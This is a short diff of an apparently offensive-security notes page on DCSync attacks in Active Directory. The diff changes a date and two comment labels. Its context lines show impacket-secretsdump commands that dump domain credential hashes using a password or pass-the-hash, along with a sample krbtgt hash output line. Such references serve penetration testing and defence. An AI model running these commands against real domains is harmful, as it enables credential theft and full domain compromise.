@@ -1,6 +1,6 @@
 ---
 title: "GetChanges/GetChangesAll"
-date: 2024-7-9
+date: 2025-7-25
 tags: ["Dcsync", "Getchanges", "Getchangesall", "Secretsdump", "Active Directory", "Windows"]
 ---
 
@@ -11,7 +11,7 @@ tags: ["Dcsync", "Getchanges", "Getchangesall", "Secretsdump", "Active Directory
 {{< tabcontent set1 tab1 >}}
 
 ```console
-# With creds
+# Password
 impacket-secretsdump -just-dc '<USER>:<PASSWORD>@<TARGET>'
 ```
 
@@ -29,7 +29,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
 ```
 
 ```console
-# With hashes
+# NTLM
 impacket-secretsdump -hashes :<HASH> -just-dc '<DOMAIN>/<USER>@<TARGET>'
 ```
 
